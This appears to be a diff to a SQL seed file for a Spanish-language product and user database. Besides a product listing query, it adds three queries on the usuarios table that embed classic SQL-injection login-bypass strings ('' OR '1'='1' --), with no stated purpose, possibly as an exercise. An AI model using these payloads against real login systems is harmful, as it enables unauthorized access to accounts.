@@ -30,3 +30,12 @@ INSERT INTO productos (nombre, precio) VALUES
     ('Mouse Logitech MX Master 3', 99.99),
     ('Cámara Canon EOS Rebel T7i', 699.00),
     ('Drone DJI Mavic Air 2', 799.00);
+
+SELECT * FROM productos;
+
+
+
+SELECT * FROM usuarios WHERE username = 'admin' AND password = '' OR '1'='1'; --
+SELECT * FROM usuarios WHERE username = 'admin' OR '1'='1' --' AND password = 'any_password'
+SELECT * FROM usuarios WHERE username = 'any_username' AND password = '' OR '1'='1' --
+
